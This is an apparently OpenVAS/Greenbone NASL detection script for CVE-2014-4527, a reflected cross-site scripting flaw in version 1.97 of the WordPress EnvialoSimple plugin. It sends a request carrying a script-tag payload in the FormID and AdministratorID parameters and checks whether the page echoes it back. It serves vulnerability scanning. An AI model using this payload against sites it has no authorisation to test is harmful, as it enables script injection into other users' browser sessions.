CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.804757" );
	script_version( "2019-11-12T13:33:43+0000" );
	script_cve_id( "CVE-2014-4527" );
	script_bugtraq_id( 69226 );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2019-11-12 13:33:43 +0000 (Tue, 12 Nov 2019)" );
	script_tag( name: "creation_date", value: "2014-08-26 16:21:56 +0530 (Tue, 26 Aug 2014)" );
	script_name( "WordPress EnvialoSimple Multiple Cross Site Scripting Vulnerabilities" );
	script_tag( name: "summary", value: "This host is installed with WordPress EnvialoSimple Plugin and is prone
to multiple cross site scripting vulnerabilities." );
	script_tag( name: "vuldetect", value: "Send a crafted data via HTTP GET request and check whether it is able to read
cookie or not." );
	script_tag( name: "insight", value: "Flaw is due to the paginas/vista-previa-form.php script does not validate input
to the 'FormID' and 'AdministratorID' GET parameters before returning to
the users." );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to execute arbitrary HTML and
script code in a user's browser session in the context of an affected site." );
	script_tag( name: "affected", value: "WordPress EnvialoSimple: Email Marketing and Newsletters Plugin
version 1.97, and possibly prior." );
	script_tag( name: "solution", value: "Update to version 1.98 or later." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "http://codevigilant.com/disclosure/wp-plugin-envialosimple-email-marketing-y-newsletters-gratis-a3-cross-site-scripting-xss" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_mandatory_keys( "wordpress/installed" );
	script_require_ports( "Services/www", 80 );
	script_xref( name: "URL", value: "http://wordpress.org/plugins/envialosimple-email-marketing-y-newsletters-gratis" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!http_port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: http_port )){
	exit( 0 );
}
url = dir + "/wp-content/plugins/envialosimple-email-marketing-y-newsletters" + "-gratis/paginas/vista-previa-form.php?FormID=FormID'><script>al" + "ert(document.cookie)</script>&AdministratorID=AdministratorID" + "'><script>alert(document.cookie)</script>";
if(http_vuln_check( port: http_port, url: url, check_header: TRUE, pattern: "<script>alert\\(document.cookie\\)</script>" )){
	security_message( http_port );
	exit( 0 );
}

